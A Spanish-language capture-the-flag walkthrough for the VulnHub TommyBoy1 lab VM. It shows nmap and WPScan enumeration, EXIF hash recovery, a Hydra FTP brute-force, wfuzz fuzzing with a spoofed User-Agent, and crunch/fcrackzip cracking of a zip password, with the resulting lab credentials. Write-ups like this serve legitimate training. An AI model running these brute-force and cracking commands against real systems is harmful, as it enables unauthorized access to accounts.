# TommyBoy1
Desarrollo del CTF TommyBoy1

## 1. Configuración de la VM

- Download la VM: https://www.vulnhub.com/entry/tommy-boy-1,157/
- Esta VM es del tipo "sigue las pistas y consigue las banderas", se deben obtener 05 banderas (FLAGS).
- Como comentario personal debo decir que no me gustan este tipo de máquinas, son una especie de "adivina lo que se me ocurrió" pero bueno.... aquí vamos.

## 2. Escaneo de Puertos

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to Callahan Auto
8008/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: KEEP OUT
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy1.jpg" width=80% />

## 3. Enumeración

### 3.1. Enumeración TCP/80

- Antes de ejecutar el DIRSEARCH o GOBUSTER, revisamos la página y encontramos código HTML comentado.
- El mensaje nos brinda un PATH a través de un video en Youtube: http://192.168.56.107/prehistoricforest/

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy2.jpg" width=80% />
```
<!--Comment from Nick: backup copy is in Big Tom's home folder-->
<!--Comment from Richard: can you give me access too? Big Tom's the only one w/password-->
<!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time-->
<!--Comment from Richard: please, I'll ask nicely-->
<!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog-->
<!--Comment from Richard: Deal.  Where's the blog again?-->
<!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--> 
<!--Comment from Richard: Ah! How could I forget?  Thanks-->
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy3.jpg" width=80% />

- También encontamos el primer FLAG en el archivo robots.txt. Obtenemos algo que parece una contraseña: Flag data: B34rcl4ws

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy4.jpg" width=80% />

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy5.jpg" width=80% />

- Ahora si ejecutamos el DIRSEARCH y GOBUSTER. Para ahorrar tiempo, debo decir que nada importante.

- En el siguiente enlace encontramos el SEGUNDO FLAG: http://192.168.56.107/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy7.jpg" width=80% />

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy8.jpg" width=80% />


### 3.2. Enumeración de Wordpress

- Ejecutamos WPSCAN y analizamos el resultado. A continuación, solo muestro parte del resultado mas relevante.

```
wpscan --api-token API_KEY --url=http://192.168.56.107/prehistoricforest/ --disable-tls-checks -e ap,u --plugins-detection aggressive 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.107/prehistoricforest/ [192.168.56.107]
[+] Started: Thu Apr 29 21:06:40 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.107/prehistoricforest/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.56.107/prehistoricforest/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.107/prehistoricforest/wp-cron.php
[+] WordPress theme in use: twentysixteen
 | Location: http://192.168.56.107/prehistoricforest/wp-content/themes/twentysixteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://192.168.56.107/prehistoricforest/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://192.168.56.107/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.3
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.107/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.3, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Aggressive Methods)

 Checking Known Locations -: |=============================================================================|
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.56.107/prehistoricforest/wp-content/plugins/akismet/
 | Latest Version: 4.1.9
 | Last Updated: 2021-03-02T18:10:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.107/prehistoricforest/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |=============================================================================|

[i] User(s) Identified:

[+] tommy
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] richard
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Tom Jr.
 | Found By: Rss Generator (Passive Detection)

[+] Big Tom
 | Found By: Rss Generator (Passive Detection)

[+] michelle
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

- Importante los usuarios identificados: tommy, richard, tom, Tom Jr., Big Tom y michelle.

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy9.jpg" width=80% />

### 3.3. Enumeración TCP/8008

- Buscamos información importante al respecto y no encontré nada imporante.

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy6.jpg" width=80% />

## 4. Analizando las imágenes 

- Había probado los dos (02) flags obtenidos para el acceso a Wordpress, el acceso por SSH y el acceso al POST, sin embargo, no tuve éxito.
- En uno de los mensajes mencionan la carpeta /richard y dentro hay una imagen. Empecé a analizar todas las imágenes obtenidas, quizás algun string o algún mensaje oculto.

```
┌──(root💀kali)-[~/TommyBoy/images/Image-ExifTool-12.25]
└─# ./exiftool ../shockedrichard.jpg 
ExifTool Version Number         : 12.25
File Name                       : shockedrichard.jpg
Directory                       : ..
File Size                       : 163 KiB
File Modification Date/Time     : 2016:07:07 15:17:24-04:00
File Access Date/Time           : 2021:05:02 19:31:35-04:00
File Inode Change Date/Time     : 2021:05:02 19:31:35-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Exif Byte Order                 : Little-endian (Intel, II)
Software                        : Google
Copyright                       : Copyright © 1995 Paramount Pictures Corporation. Credit: © 1995 Paramount Pictures / Courtesy: Pyxurz.
Exif Version                    : 0220
User Comment                    : ce154b5a8e59c89732bc25d6a2e6b90b
Exif Image Width                : 1600
Exif Image Height               : 1029
XMP Toolkit                     : Image::ExifTool 9.97
Rights                          : Copyright © 1995 Paramount Pictures Corporation. Credit: © 1995 Paramount Pictures / Courtesy: Pyxurz.
Creator Tool                    : Google
Profile CMM Type                : Linotronic
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy10.jpg" width=80% />

- En la sección "USER COMMENT" encontramos un HASH. El hash es un MD5: spanky

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy11.jpg" width=80% />

- Con "spanky" debemos intentar el acceso otra vez por SSH, por Wordpress y al POST de Wordpress protegido.
- Entramos al POST protegido y nos topamos con un mensaje algo largo.

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy12.jpg" width=80% />

- En el mensaje nos indican que hay un puerto FTP que se abre cada cierto tiempo. Ejecutamos NMAP para encontrarlo, el puerto TCP/65534.

```
┌──(root💀kali)-[~/tools/dirsearch]
└─# nmap -n -P0 -T5 -p- 192.168.56.107                                          147 ⨯ 1 ⚙
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 19:59 EDT
Nmap scan report for 192.168.56.107
Host is up (0.015s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8008/tcp  open  http
65534/tcp open  unknown
```

## 5. Cracking ONLINE

- Ahora que tenemos el puerto TCP/65534 y tenemos usuarios, vamos a probar intentos de acceso no autorizado.
- El usuario nickburns lo encontramos en el POST protegido con contraseña.

```
┌──(root💀kali)-[~/TommyBoy]
└─# hydra -V -t 4 -L users.txt -P password.txt ftp://192.168.56.107:65534                                         130 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-02 22:29:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 36 login tries (l:9/p:4), ~9 tries per task
[DATA] attacking ftp://192.168.56.107:65534/
[ATTEMPT] target 192.168.56.107 - login "tommy" - pass "B34rcl4ws" - 1 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tommy" - pass "Z4l1nsky" - 2 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tommy" - pass "spanky" - 3 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tommy" - pass "nickburns" - 4 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "richard" - pass "B34rcl4ws" - 5 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "richard" - pass "Z4l1nsky" - 6 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "richard" - pass "spanky" - 7 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "richard" - pass "nickburns" - 8 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tom" - pass "B34rcl4ws" - 9 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tom" - pass "Z4l1nsky" - 10 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tom" - pass "spanky" - 11 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "tom" - pass "nickburns" - 12 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Tom Jr." - pass "B34rcl4ws" - 13 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Tom Jr." - pass "Z4l1nsky" - 14 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Tom Jr." - pass "spanky" - 15 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Tom Jr." - pass "nickburns" - 16 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Big Tom" - pass "B34rcl4ws" - 17 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Big Tom" - pass "Z4l1nsky" - 18 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Big Tom" - pass "spanky" - 19 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Big Tom" - pass "nickburns" - 20 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "michelle" - pass "B34rcl4ws" - 21 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "michelle" - pass "Z4l1nsky" - 22 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "michelle" - pass "spanky" - 23 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "michelle" - pass "nickburns" - 24 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "root" - pass "B34rcl4ws" - 25 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "root" - pass "Z4l1nsky" - 26 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "root" - pass "spanky" - 27 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "root" - pass "nickburns" - 28 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Nick" - pass "B34rcl4ws" - 29 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Nick" - pass "Z4l1nsky" - 30 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Nick" - pass "spanky" - 31 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "Nick" - pass "nickburns" - 32 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.56.107 - login "nickburns" - pass "B34rcl4ws" - 33 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.56.107 - login "nickburns" - pass "Z4l1nsky" - 34 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.56.107 - login "nickburns" - pass "spanky" - 35 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.56.107 - login "nickburns" - pass "nickburns" - 36 of 36 [child 2] (0/0)
[65534][ftp] host: 192.168.56.107   login: nickburns   password: nickburns
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy13.jpg" width=80% />

- Nos conectamos por FTP y obtenemos el archivo dentro.

```
┌──(root💀kali)-[~/TommyBoy]
└─# ftp 192.168.56.107 65534                                                                    1 ⚙
Connected to 192.168.56.107.
220 Callahan_FTP_Server 1.3.5
Name (192.168.56.107:kali): nickburns
331 Password required for nickburns
Password:
230 User nickburns logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,56,107,128,176).
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
226 Transfer complete
ftp> get readme.txt
local: readme.txt remote: readme.txt
227 Entering Passive Mode (192,168,56,107,180,39).
150 Opening BINARY mode data connection for readme.txt (977 bytes)
226 Transfer complete
977 bytes received in 0.00 secs (3.2240 MB/s)
ftp> exit
221 Goodbye.
                                                                                                    
┌──(root💀kali)-[~/TommyBoy]
└─# cat readme.txt                                                                              1 ⚙
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
```

## 6. FUZZING y CRACKING DE ZIP

- En la nueva pista nos indica que existe un folder llamado "NickIzL33t". Lo encontramos en el en el puerto TCP/8008.
- La primera impresión es que no hay nada en esta carpeta, sin embargo, mencionan por segunda vez a Steve Jobs y que sólo el puede ver el mensaje. Toca cambiar el "user-agent" para acceder a otro tipo de información, es obvio que debemos modificarlo con algo asociado a "APPLE".

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy14.jpg" width=80% />

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy15.jpg" width=80% />

- Obtenemos una nueva pista. Debemos buscar un archivo con extensión HTML, vamos a probar con el archivo ROCKYOU. El archivo encontrado es fallon1.html

```
┌──(root💀kali)-[~/TommyBoy]
└─# wfuzz -c -v -w /usr/share/wordlist/rockyou.txt -H "User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16" --hc 404 http://192.168.56.107:8008/NickIzL33t/FUZZ.html      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.107:8008/NickIzL33t/FUZZ.html
Total requests: 4

====================================================================================================================================================
ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload             
====================================================================================================================================================

000000004:   0.005s       200        12 L       65 W     459 Ch      Apache/2.4.18 (Ubuntu)                                            "fallon1"           
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy16.jpg" width=80% />

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy17.jpg" width=80% />

- Encontramos la pista de una contraseña, un archivo ZIP y el 3er FLAG.

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy18.jpg" width=80% />

- Vamos a formar la contraseña en base a las pistas indicadas.

```
┌──(root💀kali)-[~/TommyBoy]
└─# crunch 13 13 -t bev,%%@@^1995 > diccionario.txt                                                      1 ⚙
Crunch will now generate the following amount of data: 812011200 bytes
774 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 58000800 

┌──(root💀kali)-[~/TommyBoy/fcrackzip]
└─# /usr/bin/fcrackzip -v -u -D -p /root/TommyBoy/diccionario.txt ../t0msp4ssw0rdz.zip                   1 ⚙
found file 'passwords.txt', (size cp/uc    332/   641, flags 9, chk 9aad)
checking pw bevG72kn~1995                           

PASSWORD FOUND!!!!: pw == bevH00tr$1995

┌──(root💀kali)-[~/TommyBoy]
└─# unzip t0msp4ssw0rdz.zip                                                                              1 ⚙
Archive:  t0msp4ssw0rdz.zip
[t0msp4ssw0rdz.zip] passwords.txt password: 
  inflating: passwords.txt  


┌──(root💀kali)-[~/TommyBoy]
└─# cat passwords.txt                                                                              130 ⨯ 1 ⚙
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ??? 
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

<img src="https://github.com/El-Palomo/TommyBoy1/blob/main/tommy19.jpg" width=80% />









